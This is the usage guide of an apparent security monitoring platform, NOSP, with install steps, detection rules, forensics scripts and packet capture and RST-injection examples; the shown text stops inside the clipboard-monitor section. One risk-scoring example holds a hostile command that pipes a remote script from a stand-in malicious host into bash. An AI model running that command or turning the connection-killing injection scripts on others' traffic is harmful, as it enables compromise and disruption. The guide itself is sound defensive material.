# NOSP vAPEX Usage Guide

**Complete Usage Documentation for Beginners and Experts**  
Cross-Platform Network Observation Security Platform

---

## Table of Contents

1. [Introduction](#introduction)
2. [Installation](#installation)
3. [Quick Start](#quick-start)
4. [Feature Overview](#feature-overview)
5. [Detailed Usage by Feature](#detailed-usage-by-feature)
6. [Command Reference](#command-reference)
7. [Advanced Configuration](#advanced-configuration)
8. [Troubleshooting](#troubleshooting)
9. [Performance Tuning](#performance-tuning)
10. [API Reference](#api-reference)

---

## Introduction

NOSP vAPEX is a real-time security monitoring platform that provides comprehensive threat detection across Windows and Linux systems. This guide covers all 18 features with complete examples for both operating systems.

### Platform Compatibility Matrix

| Feature | Windows | Linux | Requires Root/Admin |
|---------|---------|-------|---------------------|
| Process Monitoring | ✅ | ✅ | Yes (Windows) |
| Network Analysis | ✅ | ✅ | No |
| File Integrity Monitoring | ✅ | ✅ | No |
| Real-time Alerts | ✅ | ✅ | No |
| Risk Scoring | ✅ | ✅ | No |
| Forensics Module | ✅ | ✅ | No |
| Process Injection Detection | ✅ | ✅ | Yes (Windows) |
| Code Injection Detection | ✅ | ✅ | Yes (Windows) |
| DLL Injection Detection | ✅ | ✅ | Yes (Windows) |
| Packet Capture | ✅ | ✅ | Yes |
| Packet Injection | ✅ | ✅ | Yes |
| ETW Monitoring | ✅ | ❌ | Yes |
| Registry Monitoring | ✅ | ❌ | Yes |
| Memory Scanning | ✅ | ❌ | Yes |
| VM Detection | ✅ | ❌ | No |
| Self-Defense | ✅ | ❌ | Yes |
| Clipboard Monitor | ✅ | ❌ | No |
| DNS Cache Monitor | ✅ | ❌ | Yes |

---

## Installation

### Windows Installation

**Prerequisites:**
- Windows 10/11 (64-bit)
- Python 3.8+ (Python 3.11+ recommended)
- Administrator privileges
- Git (optional, for source installation)

**Option 1: From Source**

```batch
REM Clone repository
git clone https://github.com/4fqr/nosp.git
cd nosp

REM Run setup script (installs dependencies)
setup.bat

REM Launch NOSP
run_nosp.bat
```

**Option 2: Manual Installation**

```batch
REM Install Python dependencies
pip install -r requirements.txt

REM Install Rust toolchain (optional, for native features)
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
cargo build --release

REM Launch NOSP
python main.py
```

**Verifying Windows Installation:**

```batch
REM Check Python version
python --version

REM Verify dependencies
pip list | findstr "PyQt5 psutil pywin32"

REM Test basic functionality
python -c "from python.nosp import risk_scorer; print('✓ NOSP modules loaded')"
```

### Linux Installation

**Prerequisites:**
- Ubuntu 20.04+, Debian 11+, or equivalent
- Python 3.8+ (Python 3.11+ recommended)
- Root access (for packet capture features)
- GCC/Clang (for native module compilation)

**Option 1: Quick Install**

```bash
# Clone repository
git clone https://github.com/4fqr/nosp.git
cd nosp

# Run setup script
chmod +x setup.sh
./setup.sh

# Launch NOSP
./run_nosp.sh
```

**Option 2: Manual Installation**

```bash
# Install system dependencies
sudo apt update
sudo apt install -y python3 python3-pip gcc libpcap-dev

# Install Python dependencies
pip3 install -r requirements.txt

# Compile native modules
cd native/c
gcc -shared -fPIC -o packet_capture.so packet_capture.c -lpcap
gcc -shared -fPIC -o packet_injector.so packet_injector.c
gcc -shared -fPIC -o pattern_matcher.so pattern_matcher.c
cd ../..

# Install Rust toolchain (optional)
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs -o rustup-init.sh
sh rustup-init.sh -y
source $HOME/.cargo/env
cargo build --release

# Launch NOSP
python3 main.py
```

**Verifying Linux Installation:**

```bash
# Check Python version
python3 --version

# Verify dependencies
pip3 list | grep -E "PyQt5|psutil"

# Check native modules
ls -lh native/c/*.so

# Test basic functionality
python3 -c "from python.nosp import risk_scorer; print('✓ NOSP modules loaded')"

# Verify packet capture capability (requires root)
sudo python3 -c "from python.nosp.native_bindings import PacketCapture; print('✓ Packet capture available')"
```

---

## Quick Start

### First Launch (Windows)

```batch
REM Launch with administrator privileges (required for full features)
run_nosp.bat

REM Or manually
python main.py
```

**First Launch Checklist:**
1. NOSP GUI opens with dark theme
2. God Mode tab shows all features
3. Risk Scorer initializes (check console for ✓ marks)
4. Database creates at `nosp_events.db`

### First Launch (Linux)

```bash
# Launch as regular user (limited features)
./run_nosp.sh

# Or with root for full capabilities
sudo python3 main.py

# Background mode
nohup sudo python3 main.py > nosp.log 2>&1 &
```

### Basic Workflow (Both Platforms)

1. **Start Monitoring:**
   - Click "God Mode" tab
   - Enable desired monitors (ETW, Registry, etc.)
   - Click "Start Monitoring"

2. **View Events:**
   - Navigate to "Timeline" tab
   - Events appear in real-time
   - Color-coded by risk level (red=critical, yellow=warning)

3. **Investigate Threats:**
   - Click on high-risk event
   - View "Forensics" tab for analysis
   - Check "Process Tree" for context

4. **Respond:**
   - Export forensics report (JSON/CSV)
   - Kill suspicious process (God Mode tab)
   - Inject RST packets to block connections

---

## Feature Overview

### Core Features (Cross-Platform)

1. **Process Monitoring** - Track all process creation events
2. **Network Analysis** - Analyze TCP/UDP connections
3. **File Integrity** - Monitor file modifications
4. **Real-time Alerts** - Get instant threat notifications
5. **Risk Scoring** - ML-powered threat assessment (0-100)
6. **Forensics** - In-depth incident analysis

### Advanced Features (Cross-Platform)

7. **Process Injection Detection** - Detect code injection attempts
8. **Code Injection Detection** - Identify shellcode injection
9. **DLL Injection Detection** - Monitor DLL loading
10. **Packet Capture** - Raw packet sniffing (requires root/admin)
11. **Packet Injection** - TCP RST/custom packet injection

### Windows-Only Features

12. **ETW Monitoring** - Windows Event Tracing integration
13. **Registry Monitoring** - Real-time registry change detection
14. **Memory Scanning** - Scan process memory for malware
15. **VM Detection** - Detect virtualized environments
16. **Self-Defense** - Prevent tampering with NOSP process
17. **Clipboard Monitor** - Track clipboard changes
18. **DNS Cache Monitor** - Monitor DNS resolution cache

---

## Detailed Usage by Feature

### 1. Process Monitoring

**Purpose:** Capture all process creation events with full command-line arguments.

**Windows Usage:**

```batch
REM Automatic on Windows with ETW
REM Events logged to console and database

REM Manual process query
python -c "import psutil; print([p.info for p in psutil.process_iter(['pid', 'name', 'cmdline'])])"

REM Filter processes
wmic process where "name='powershell.exe'" get ProcessId,CommandLine
```

**Linux Usage:**

```bash
# View process monitoring in NOSP
# Logs shown in Timeline tab

# Manual process query
ps auxf

# Monitor process creation with auditd
sudo auditctl -a always,exit -F arch=b64 -S execve

# View recent processes
python3 -c "import psutil; [print(f'{p.pid}: {p.name()}') for p in psutil.process_iter()]"
```

**Key Indicators:**
- Processes spawned from Office applications
- PowerShell with encoded commands
- Unusual parent-child relationships
- Processes with no digital signature

**Example Output:**

```
[ALERT] High-Risk Process Detected
PID: 4892
Process: powershell.exe
Command: powershell.exe -EncodedCommand JABzAD0ATgB...
Parent: winword.exe
Risk Score: 87/100
Factors: [encoded_command, office_spawn, no_signature]
```

### 2. Network Analysis

**Purpose:** Monitor network connections and identify suspicious communication.

**Windows Usage:**

```batch
REM View active connections in NOSP Timeline
REM Or manually:

netstat -anob | findstr ESTABLISHED

REM Check specific process connections
netstat -ano | findstr 4892

REM NOSP API usage
python -c "from python.nosp.network_monitor import NetworkMonitor; nm = NetworkMonitor(); nm.get_connections()"
```

**Linux Usage:**

```bash
# View connections in NOSP Timeline
# Or manually:

# All established connections
ss -tunap | grep ESTAB

# Connections by process
sudo netstat -tulnp | grep python3

# NOSP API usage
python3 -c "from python.nosp.network_monitor import NetworkMonitor; nm = NetworkMonitor(); print(nm.get_connections())"

# Monitor with tcpdump
sudo tcpdump -i any -n 'tcp and port not 22'
```

**Suspicious Indicators:**
- Connections to known malicious IPs
- Unusual ports (e.g., IRC ports 6667, 6697)
- High-volume data exfiltration
- Beaconing behavior (regular intervals)

**Example: Detect Command & Control (C2):**

```python
# Both Windows and Linux
from python.nosp.network_monitor import NetworkMonitor
from collections import Counter

nm = NetworkMonitor()
connections = nm.get_connections()

# Find most frequent remote IPs
remote_ips = [conn['remote_addr'] for conn in connections]
frequent_ips = Counter(remote_ips).most_common(5)

print("Top 5 contacted IPs:")
for ip, count in frequent_ips:
    print(f"{ip}: {count} connections")
```

### 3. File Integrity Monitoring (FIM)

**Purpose:** Detect unauthorized file modifications in critical directories.

**Windows Usage:**

```batch
REM Configure FIM in NOSP
REM Go to Settings -> FIM -> Add Path

REM Monitor paths:
REM - C:\Windows\System32
REM - C:\Program Files
REM - C:\Users\[User]\AppData

REM Manual file hash check
certutil -hashfile C:\Windows\System32\cmd.exe SHA256

REM NOSP CLI
python -c "from python.nosp.forensics import ForensicsEngine; fe = ForensicsEngine(); fe.check_file_integrity('C:\\Windows\\System32\\cmd.exe')"
```

**Linux Usage:**

```bash
# Configure FIM in NOSP
# Settings -> FIM -> Add Path

# Monitor paths:
# - /bin
# - /usr/bin
# - /etc
# - /home/[user]/.ssh

# Manual file hash check
sha256sum /bin/bash

# NOSP CLI
python3 -c "from python.nosp.forensics import ForensicsEngine; fe = ForensicsEngine(); fe.check_file_integrity('/bin/bash')"

# Use inotify for real-time monitoring
inotifywait -m -r /etc -e modify,create,delete
```

**Critical Files to Monitor:**

**Windows:**
- `C:\Windows\System32\*.dll` - Core Windows libraries
- `C:\Windows\System32\drivers\*.sys` - Kernel drivers
- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` - Startup items

**Linux:**
- `/bin/*`, `/usr/bin/*` - System executables
- `/etc/passwd`, `/etc/shadow` - User accounts
- `/etc/crontab`, `/etc/cron.d/*` - Scheduled tasks
- `/root/.ssh/authorized_keys` - SSH access

**Example Alert:**

```
[CRITICAL] File Integrity Violation
File: C:\Windows\System32\svchost.exe
Expected Hash: a1b2c3d4...
Actual Hash: e5f6g7h8...
Action: MODIFIED
Timestamp: 2026-02-08 14:23:45
```

### 4. Real-time Alerts

**Purpose:** Instant notifications for critical security events.

**Windows Configuration:**

```batch
REM Configure alerts in NOSP GUI
REM Settings -> Alerts -> Configure

REM Alert channels:
REM - GUI notifications (Windows toast)
REM - Console output
REM - Email (SMTP)
REM - Webhook (Discord, Slack, custom)

REM Test alert
python -c "from python.nosp.alerts import AlertManager; am = AlertManager(); am.send_alert('Test', 'This is a test alert', 'high')"
```

**Linux Configuration:**

```bash
# Configure alerts in NOSP GUI
# Settings -> Alerts -> Configure

# Alert channels:
# - GUI notifications (libnotify)
# - Console output
# - Email (SMTP)
# - Webhook (Discord, Slack, custom)
# - Syslog

# Test alert
python3 -c "from python.nosp.alerts import AlertManager; am = AlertManager(); am.send_alert('Test', 'This is a test alert', 'high')"

# System notifications
notify-send "NOSP Alert" "High-risk event detected"
```

**Alert Configuration File** (`alerts.yaml`):

```yaml
alerts:
  enabled: true
  min_risk_score: 70  # Only alert on high-risk events
  
  channels:
    gui:
      enabled: true
    
    console:
      enabled: true
      color_coded: true
    
    email:
      enabled: false
      smtp_server: smtp.gmail.com
      smtp_port: 587
      sender: alerts@example.com
      recipients:
        - admin@example.com
      subject_prefix: "[NOSP ALERT]"
    
    webhook:
      enabled: false
      url: https://discord.com/api/webhooks/...
      method: POST
      format: json
  
  rules:
    - name: "Office Spawning PowerShell"
      severity: critical
      conditions:
        - field: process_name
          operator: contains
          value: powershell
        - field: parent_name
          operator: regex
          value: (winword|excel|outlook)\.exe

    - name: "Encoded Command Execution"
      severity: high
      conditions:
        - field: cmdline
          operator: contains
          value: -enc
```

### 5. Risk Scoring Engine

**Purpose:** ML-powered threat assessment scoring events from 0-100.

**How It Works:**

NOSP's risk scorer evaluates multiple factors:
- Process characteristics (20%)
- Network behavior (15%)
- File operations (10%)
- User context (10%)
- Historical patterns (15%)
- Threat intelligence (30%)

**Windows Example:**

```python
from python.nosp.risk_scorer import RiskScorer

scorer = RiskScorer()

# Example event from ETW
event = {
    'process_name': 'powershell.exe',
    'image': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    'cmdline': 'powershell.exe -ExecutionPolicy Bypass -EncodedCommand SGVsbG8...',
    'parent_name': 'winword.exe',
    'parent_image': 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
    'user': 'CORP\\jdoe',
    'hashes': {
        'SHA256': 'a1b2c3d4e5f6...'
    },
    'network_connections': [
        {'remote_addr': '192.168.1.100', 'remote_port': 4444}
    ]
}

score, factors = scorer.calculate_risk(event)

print(f"Risk Score: {score}/100")
print(f"Risk Factors:")
for factor in factors:
    print(f"  - {factor}")

# Output:
# Risk Score: 92/100
# Risk Factors:
#   - Office application spawned PowerShell (30 points)
#   - Encoded command execution (25 points)
#   - Execution policy bypass (15 points)
#   - Network connection to unusual port (12 points)
#   - User context: standard user (10 points)
```

**Linux Example:**

```python
from python.nosp.risk_scorer import RiskScorer

scorer = RiskScorer()

# Example suspicious bash script
event = {
    'process_name': 'bash',
    'image': '/bin/bash',
    'cmdline': '/bin/bash -c "curl http://malicious.com/payload.sh | bash"',
    'parent_name': 'cron',
    'parent_image': '/usr/sbin/cron',
    'user': 'root',
    'network_connections': [
        {'remote_addr': '185.220.101.52', 'remote_port': 80}
    ]
}

score, factors = scorer.calculate_risk(event)

print(f"Risk Score: {score}/100")
print(f"Risk Factors:")
for factor in factors:
    print(f"  - {factor}")

# Output:
# Risk Score: 88/100
# Risk Factors:
#   - Remote script execution via curl piping (35 points)
#   - Cron job spawned bash with network activity (20 points)
#   - Root user context (15 points)
#   - Known malicious IP (tor exit node) (18 points)
```

**Tuning Risk Scores:**

Edit `risk_weights.yaml`:

```yaml
risk_weights:
  process:
    encoded_command: 25
    unsigned_binary: 20
    rare_process: 15
    office_spawn: 30
    system_spawn: 10
  
  network:
    unusual_port: 12
    external_ip: 8
    high_volume: 15
    known_malicious: 30
  
  user:
    admin_context: 5
    standard_user: 10
    guest_user: 3
```

### 6. Forensics Module

**Purpose:** Deep-dive analysis of security incidents with automated evidence collection.

**Windows Forensics:**

```python
from python.nosp.forensics import ForensicsEngine

# Initialize forensics engine
fe = ForensicsEngine()

# Investigate a suspicious process
pid = 4892
report = fe.investigate_process(pid)

print(report.summary)
# Output includes:
# - Process tree (parent -> child hierarchy)
# - Network connections
# - File operations
# - Registry modifications
# - Loaded DLLs
# - Memory regions
# - Timeline reconstruction

# Export report
fe.export_report(report, format='json', output='forensics_report_4892.json')
fe.export_report(report, format='html', output='forensics_report_4892.html')
```

**Linux Forensics:**

```python
from python.nosp.forensics import ForensicsEngine

# Initialize forensics engine
fe = ForensicsEngine()

# Investigate a suspicious process
pid = 12345
report = fe.investigate_process(pid)

print(report.summary)
# Output includes:
# - Process tree
# - Network connections (via /proc/net/tcp)
# - File operations (open file descriptors via /proc/pid/fd)
# - Memory maps (via /proc/pid/maps)
# - Environment variables
# - Command line arguments
# - Timeline reconstruction

# Export report
fe.export_report(report, format='json', output='forensics_report_12345.json')
```

**Manual Forensics (Windows):**

```batch
REM Capture process information
wmic process where processid=4892 get * /format:list > process_4892.txt

REM List loaded DLLs
tasklist /m /fi "PID eq 4892" > dlls_4892.txt

REM Network connections
netstat -ano | findstr 4892 > network_4892.txt

REM Memory dump with Sysinternals ProcDump
procdump.exe -ma 4892 process_4892.dmp

REM Check for code injection
Get-Process -Id 4892 | Select-Object -ExpandProperty Modules
```

**Manual Forensics (Linux):**

```bash
# Capture process information
ps aux | grep 12345 > process_12345.txt
cat /proc/12345/status > process_status_12345.txt
cat /proc/12345/cmdline > cmdline_12345.txt

# List loaded libraries
cat /proc/12345/maps > maps_12345.txt
lsof -p 12345 > lsof_12345.txt

# Network connections
ss -tunaop | grep 12345 > network_12345.txt
cat /proc/12345/net/tcp > tcp_12345.txt

# Memory dump with gcore
sudo gcore 12345  # Creates core.12345

# Environment variables
cat /proc/12345/environ | tr '\0' '\n' > env_12345.txt

# Open files
ls -l /proc/12345/fd/ > fd_12345.txt
```

**Automated Forensics Collection Script:**

```python
# forensics_collector.py - Works on both Windows and Linux

import platform
import subprocess
import json
from datetime import datetime
from python.nosp.forensics import ForensicsEngine

def collect_forensics(pid):
    """Collect comprehensive forensics for a process"""
    
    fe = ForensicsEngine()
    system = platform.system()
    timestamp = datetime.now().isoformat()
    
    forensics_data = {
        'timestamp': timestamp,
        'platform': system,
        'pid': pid,
        'nosp_analysis': {},
        'manual_collection': {}
    }
    
    # NOSP automated analysis
    report = fe.investigate_process(pid)
    forensics_data['nosp_analysis'] = report.to_dict()
    
    # Platform-specific manual collection
    if system == 'Windows':
        # Process info
        proc_info = subprocess.run(
            ['wmic', 'process', 'where', f'processid={pid}', 'get', '*', '/format:list'],
            capture_output=True, text=True
        )
        forensics_data['manual_collection']['process_info'] = proc_info.stdout
        
        # DLLs
        dlls = subprocess.run(
            ['tasklist', '/m', '/fi', f'PID eq {pid}'],
            capture_output=True, text=True
        )
        forensics_data['manual_collection']['loaded_dlls'] = dlls.stdout
    
    elif system == 'Linux':
        # Process status
        try:
            with open(f'/proc/{pid}/status', 'r') as f:
                forensics_data['manual_collection']['status'] = f.read()
        except:
            pass
        
        # Command line
        try:
            with open(f'/proc/{pid}/cmdline', 'r') as f:
                forensics_data['manual_collection']['cmdline'] = f.read()
        except:
            pass
        
        # Memory maps
        try:
            with open(f'/proc/{pid}/maps', 'r') as f:
                forensics_data['manual_collection']['maps'] = f.read()
        except:
            pass
    
    # Save report
    output_file = f'forensics_{pid}_{timestamp.replace(":", "-")}.json'
    with open(output_file, 'w') as f:
        json.dump(forensics_data, f, indent=2)
    
    print(f"✓ Forensics report saved to {output_file}")
    return forensics_data

# Usage
if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print("Usage: python forensics_collector.py <PID>")
        sys.exit(1)
    
    pid = int(sys.argv[1])
    collect_forensics(pid)
```

### 7-9. Injection Detection (Process/Code/DLL)

**Purpose:** Detect various code injection techniques used by malware.

**Windows Detection:**

```python
from python.nosp.injection_detector import InjectionDetector

detector = InjectionDetector()

# Continuous monitoring
detector.start_monitoring()

# Manual process scan
suspicious_processes = detector.scan_all_processes()

for proc in suspicious_processes:
    print(f"[ALERT] Injection detected in PID {proc['pid']}")
    print(f"  Process: {proc['name']}")
    print(f"  Injection Type: {proc['injection_type']}")
    print(f"  Indicators: {proc['indicators']}")
```

**Injection Techniques Detected:**

1. **Process Injection:**
   - CreateRemoteThread
   - QueueUserAPC
   - SetWindowsHookEx
   - Process Hollowing

2. **Code Injection:**
   - Shellcode injection
   - Reflective DLL loading
   - Thread execution hijacking

3. **DLL Injection:**
   - LoadLibrary injection
   - Manual mapping
   - DLL proxying

**Linux Detection:**

```python
from python.nosp.injection_detector import InjectionDetector

detector = InjectionDetector()

# Check for ptrace usage (common for injection)
suspicious = detector.detect_ptrace_usage()

# Check for LD_PRELOAD hijacking
preload_checks = detector.check_ld_preload()

# Memory analysis
for proc in detector.scan_all_processes():
    if proc['suspicious_memory_regions']:
        print(f"[WARN] Suspicious memory in PID {proc['pid']}")
```

**Manual Injection Detection (Windows):**

```powershell
# Check for remote threads
Get-Process | ForEach-Object {
    $id = $_.Id
    $threads = Get-WmiObject Win32_Thread -Filter "ProcessHandle = $id"
    $foreign = $threads | Where-Object { $_.StartAddress -notlike "*$($_.ProcessHandle)*" }
    if ($foreign) {
        Write-Host "Suspicious threads in PID $id"
    }
}

# List unsigned DLLs
Get-Process | ForEach-Object {
    $_.Modules | Where-Object { 
        (Get-AuthenticodeSignature $_.FileName).Status -ne 'Valid'
    }
}
```

**Manual Injection Detection (Linux):**

```bash
# Check for ptrace usage
ps aux | grep -i ptrace
grep -r "ptrace" /proc/*/status

# LD_PRELOAD check
ps aux -e | grep LD_PRELOAD
cat /proc/*/environ | grep LD_PRELOAD

# Suspicious memory mappings
for pid in /proc/[0-9]*; do
    maps="$pid/maps"
    if [ -f "$maps" ]; then
        grep -E "rwxp|---p" "$maps" 2>/dev/null && echo "Suspicious memory in $pid"
    fi
done
```

### 10. Packet Capture

**Purpose:** Capture raw network packets for deep protocol analysis.

**Windows Usage:**

```batch
REM Requires Administrator privileges
REM Uses native C module (packet_capture.so)

python -c "from python.nosp.native_bindings import PacketCapture; pc = PacketCapture('Ethernet0'); pc.start_capture(packet_count=100)"

REM Alternative with Wireshark/tshark
tshark -i "Ethernet0" -w capture.pcap -c 100

REM Filter specific traffic
tshark -i "Ethernet0" -f "tcp port 443" -w https_traffic.pcap
```

**Linux Usage:**

```bash
# Requires root privileges
# Uses native C module (packet_capture.so)

sudo python3 -c "from python.nosp.native_bindings import PacketCapture; pc = PacketCapture('eth0'); pc.start_capture(packet_count=100)"

# Alternative with tcpdump
sudo tcpdump -i eth0 -w capture.pcap -c 100

# Filter specific traffic
sudo tcpdump -i eth0 'tcp port 443' -w https_traffic.pcap -c 50

# Capture with verbose output
sudo tcpdump -i eth0 -vv -c 20
```

**NOSP GUI Packet Capture:**

1. Navigate to "God Mode" tab
2. Select network interface from dropdown
3. Click "Start Packet Capture"
4. Set filter (e.g., "tcp and port 80")
5. View packets in real-time
6. Export to PCAP format

**Programmatic Usage:**

```python
# packet_capture_example.py - Works on both platforms

from python.nosp.native_bindings import PacketCapture
import time

def capture_packets(interface='eth0', count=100, filter_str='tcp'):
    """
    Capture network packets
    
    Args:
        interface: Network interface name (eth0, wlan0, Ethernet0)
        count: Number of packets to capture
        filter_str: BPF filter string
    """
    
    try:
        pc = PacketCapture(interface)
        pc.set_filter(filter_str)
        
        print(f"Starting capture on {interface}...")
        packets = pc.start_capture(packet_count=count)
        
        print(f"Captured {len(packets)} packets")
        
        # Analyze packets
        for i, pkt in enumerate(packets):
            print(f"\nPacket {i+1}:")
            print(f"  Timestamp: {pkt['timestamp']}")
            print(f"  Length: {pkt['length']} bytes")
            print(f"  Protocol: {pkt['protocol']}")
            
            if 'src_ip' in pkt:
                print(f"  Source: {pkt['src_ip']}:{pkt['src_port']}")
                print(f"  Destination: {pkt['dst_ip']}:{pkt['dst_port']}")
        
        # Export to PCAP
        pc.export_pcap('captured_packets.pcap')
        print("\n✓ Packets saved to captured_packets.pcap")
        
        return packets
    
    except PermissionError:
        print("✗ Error: Packet capture requires root/administrator privileges")
        return None

# Usage
if __name__ == '__main__':
    import platform
    
    # Determine interface based on platform
    if platform.system() == 'Windows':
        interface = 'Ethernet0'  # or 'WiFi'
    else:
        interface = 'eth0'  # or 'wlan0'
    
    # Capture HTTP traffic
    packets = capture_packets(interface, count=50, filter_str='tcp port 80')
```

### 11. Packet Injection

**Purpose:** Inject custom packets for active security testing and threat response.

**Windows Usage:**

```python
from python.nosp.native_bindings import PacketInjector

# Initialize injector (requires Administrator)
injector = PacketInjector()

# Inject TCP RST to kill connection
src_ip = '192.168.1.100'
dst_ip = '192.168.1.200'
src_port = 54321
dst_port = 80
sequence_num = 123456789

injector.inject_tcp_rst(src_ip, src_port, dst_ip, dst_port, sequence_num)
print("✓ TCP RST packet injected")

# Bidirectional kill (send RST both ways)
injector.kill_connection_bidirectional(src_ip, src_port, dst_ip, dst_port, seq1, seq2)
```

**Linux Usage:**

```bash
# Requires root privileges

# Python API
sudo python3 -c "
from python.nosp.native_bindings import PacketInjector
pi = PacketInjector()
pi.inject_tcp_rst('192.168.1.100', 54321, '192.168.1.200', 80, 123456789)
print('✓ RST packet sent')
"

# Manual with scapy
sudo python3 -c "
from scapy.all import IP, TCP, send
rst = IP(src='192.168.1.100', dst='192.168.1.200')/TCP(sport=54321, dport=80, flags='R', seq=123456789)
send(rst)
"

# Manual with hping3
sudo hping3 -c 1 -R -s 54321 -p 80 -M 123456789 192.168.1.200
```

**NOSP GUI Packet Injection:**

1. Navigate to "God Mode" tab
2. Click "Show God Menu"
3. In "Packet Injection" section:
   - Enter source IP/port
   - Enter destination IP/port
   - Enter sequence number (optional, auto-detected)
   - Click "Inject RST Packet"

**Complete Connection Killer Script:**

```python
# connection_killer.py - Works on both platforms

from python.nosp.native_bindings import PacketInjector
from python.nosp.network_monitor import NetworkMonitor
import platform

def kill_connection(process_name):
    """
    Find and kill all network connections for a process
    
    Args:
        process_name: Name of process (e.g., 'chrome.exe', 'firefox')
    """
    
    nm = NetworkMonitor()
    pi = PacketInjector()
    
    # Find connections for process
    connections = nm.get_connections_by_process(process_name)
    
    if not connections:
        print(f"No connections found for {process_name}")
        return
    
    print(f"Found {len(connections)} connections for {process_name}")
    
    # Kill each connection
    for conn in connections:
        try:
            src_ip = conn['local_addr']
            src_port = conn['local_port']
            dst_ip = conn['remote_addr']
            dst_port = conn['remote_port']
            
            print(f"Killing connection: {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
            
            # Send RST packets both directions
            pi.kill_connection_bidirectional(
                src_ip, src_port, dst_ip, dst_port,
                conn['seq_local'], conn['seq_remote']
            )
            
            print("  ✓ Connection terminated")
        
        except Exception as e:
            print(f"  ✗ Failed: {e}")
    
    print(f"\n✓ Killed {len(connections)} connections")

# Usage
if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python connection_killer.py <process_name>")
        print("Examples:")
        print("  Windows: python connection_killer.py chrome.exe")
        print("  Linux: sudo python3 connection_killer.py firefox")
        sys.exit(1)
    
    process = sys.argv[1]
    
    # Check for root/admin
    is_admin = (platform.system() == 'Windows' and ctypes.windll.shell32.IsUserAnAdmin()) \
                or (platform.system() != 'Windows' and os.geteuid() == 0)
    
    if not is_admin:
        print("✗ Error: Packet injection requires root/administrator privileges")
        sys.exit(1)
    
    kill_connection(process)
```

### 12. ETW Monitoring (Windows Only)

**Purpose:** Monitor Windows Event Tracing for low-level system events.

```python
from python.nosp.etw_monitor import ETWMonitor

# Initialize ETW monitor
etw = ETWMonitor()

# Subscribe to process creation events
etw.subscribe_process_events(callback=lambda event: print(f"Process created: {event}"))

# Subscribe to network events
etw.subscribe_network_events(callback=lambda event: print(f"Network event: {event}"))

# Subscribe to file events
etw.subscribe_file_events(callback=lambda event: print(f"File event: {event}"))

# Start monitoring
etw.start_monitoring()

# Run for 60 seconds
import time
time.sleep(60)

# Stop monitoring
etw.stop_monitoring()
```

**Manual ETW via PowerShell:**

```powershell
# List ETW providers
logman query providers

# Start trace session
logman create trace nosp_trace -ow -o c:\nosp_trace.etl -p "Microsoft-Windows-Kernel-Process" 0xffffffffffffffff 0xff -nb 16 16 -bs 1024 -mode Circular -f bincirc -max 4096 -ets

# Stop trace
logman stop nosp_trace -ets

# Convert to readable format
netsh trace convert input=c:\nosp_trace.etl output=c:\nosp_trace.txt
```

### 13. Registry Monitoring (Windows Only)

**Purpose:** Monitor Windows Registry changes in real-time.

```python
from python.nosp.registry_monitor import RegistryMonitor

# Initialize registry monitor
rm = RegistryMonitor()

# Monitor specific keys
rm.add_watch('HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run')
rm.add_watch('HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run')
rm.add_watch('HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services')

# Start monitoring
rm.start_monitoring(callback=lambda change: print(f"Registry change: {change}"))

# ...monitor runs in background...

# Stop monitoring
rm.stop_monitoring()
```

**Manual Registry Monitoring:**

```powershell
# Export registry key for baseline
reg export "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" baseline.reg

# Monitor with autoruns
autorunsc.exe -a * -c -h -m > autoruns_baseline.csv

# Later, compare
autorunsc.exe -a * -c -h -m > autoruns_current.csv
Compare-Object (Get-Content baseline.csv) (Get-Content current.csv)
```

### 14. Memory Scanning (Windows Only)

**Purpose:** Scan process memory for malware signatures and anomalies.

```python
from python.nosp.memory_scanner import MemoryScanner

# Initialize scanner
ms = MemoryScanner()

# Scan specific process
results = ms.scan_process(pid=1234)

print(f"Scan Results for PID {1234}:")
print(f"  Suspicious regions: {results['suspicious_count']}")
print(f"  Malware signatures found: {len(results['signatures'])}")

for sig in results['signatures']:
    print(f"    - {sig['name']} at offset {sig['offset']}")

# Scan all processes
all_results = ms.scan_all_processes()

for pid, result in all_results.items():
    if result['suspicious_count'] > 0:
        print(f"[ALERT] Suspicious memory in PID {pid}")
```

**Manual Memory Scanning:**

```batch
REM Using WinDbg
windbg -p 1234
!analyze -v

REM Using volatility (on memory dump)
volatility -f memory.dmp --profile=Win10x64 malfind
volatility -f memory.dmp --profile=Win10x64 pslist
volatility -f memory.dmp --profile=Win10x64 netscan
```

### 15. VM Detection (Windows Only)

**Purpose:** Detect if NOSP is running in a virtual machine.

```python
from python.nosp.vm_detector import VMDetector

# Check for virtualization
detector = VMDetector()
result = detector.detect()

print(f"Running in VM: {result['is_vm']}")
if result['is_vm']:
    print(f"VM Type: {result['vm_type']}")
    print(f"Confidence: {result['confidence']}%")
    print(f"Indicators:")
    for indicator in result['indicators']:
        print(f"  - {indicator}")
```

**Detection Methods:**
- CPUID instructions
- MAC address vendor check
- Registry keys
- Hardware device strings
- BIOS information
- Process names (VMware Tools, VBoxService)

### 16. Self-Defense (Windows Only)

**Purpose:** Protect NOSP process from tampering and termination.

```python
from python.nosp.self_defense import SelfDefense

# Enable self-defense
sd = SelfDefense()
sd.enable()

print("✓ Self-defense enabled")
print("  - Process termination protection: ON")
print("  - Debug protection: ON")
print("  - Memory protection: ON")

# NOSP is now protected from:
# - taskkill
# - Process Explorer termination
# - Debug attachment
# - Memory reading/writing
```

**Test Self-Defense:**

```batch
REM Try to kill NOSP (will fail)
taskkill /PID <nosp_pid> /F
REM Output: ERROR: The process "<nosp_pid>" could not be terminated.

REM Try to suspend (will fail)
powershell Suspend-Process -Id <nosp_pid>
REM Output: Access denied
```

### 17. Clipboard Monitor (Windows Only)

**Purpose:** Monitor clipboard changes for sensitive data leakage.

```python
from python.nosp.clipboard_monitor import ClipboardMonitor

# Initialize monitor
cm = ClipboardMonitor()

def clipboard_callback(data):
    print(f"[CLIPBOARD] New data detected")
    print(f"  Type: {data['type']}")
    print(f"  Length: {len(data['content'])} chars")
